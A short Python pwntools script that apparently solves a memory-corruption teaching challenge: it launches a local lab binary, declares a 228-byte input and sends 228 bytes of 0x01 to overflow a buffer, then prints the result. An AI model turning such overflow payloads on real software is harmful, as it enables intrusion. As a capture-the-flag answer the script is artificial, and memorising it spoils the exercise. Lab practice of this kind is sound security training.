import pwn

io = pwn.process("/challenges/mem/level2_teaching1")

io.send("228\n")

payload = bytes([0x1]*228)

io.send(payload)

output = io.readall().decode('ascii')
print(output)